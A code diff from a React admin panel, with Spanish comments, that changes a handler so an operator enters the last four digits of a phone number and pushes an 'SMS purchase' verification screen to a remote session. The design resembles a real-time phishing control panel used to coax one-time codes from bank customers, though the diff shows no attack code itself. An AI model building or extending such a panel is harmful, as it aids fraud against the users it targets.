@@ -362,34 +362,25 @@ export default function AdminPanel() {
   };
 
   const handleSmsCompraConfirm = (telefono: string) => {
-    // Update session with phone number and send sms_compra screen
-    if (telefono && telefono.length === 10) {
-      const terminacion = telefono.substring(telefono.length - 4);
+    // Solo esperamos los últimos 4 dígitos del teléfono
+    if (telefono && telefono.length === 4) {
+      const terminacion = telefono; // Ya tenemos directamente los 4 dígitos
       
-      // First update the session with the phone number
+      // Enviar directamente la pantalla de SMS_COMPRA con los 4 dígitos
       if (selectedSessionId) {
-        apiRequest('POST', `/api/sessions/${selectedSessionId}/update`, { celular: telefono })
-          .then(() => {
-            // Then send the screen change
-            console.log("ScreenType.SMS_COMPRA:", ScreenType.SMS_COMPRA);
-            sendScreenChange({
-              tipo: `mostrar_${ScreenType.SMS_COMPRA}`,
-              sessionId: selectedSessionId,
-              terminacion
-            });
-          })
-          .catch(error => {
-            toast({
-              title: "Error al actualizar teléfono",
-              description: error.message,
-              variant: "destructive",
-            });
-          });
+        // Entonces, send the screen change directamente
+        console.log("ScreenType.SMS_COMPRA:", ScreenType.SMS_COMPRA);
+        console.log("Enviando terminación:", terminacion);
+        sendScreenChange({
+          tipo: `mostrar_${ScreenType.SMS_COMPRA}`,
+          sessionId: selectedSessionId,
+          terminacion
+        });
       }
     } else {
       toast({
-        title: "Teléfono inválido",
-        description: "Ingrese un número de teléfono válido de 10 dígitos.",
+        title: "Entrada inválida",
+        description: "Ingrese exactamente los 4 últimos dígitos del número celular.",
         variant: "destructive",
       });
       return;
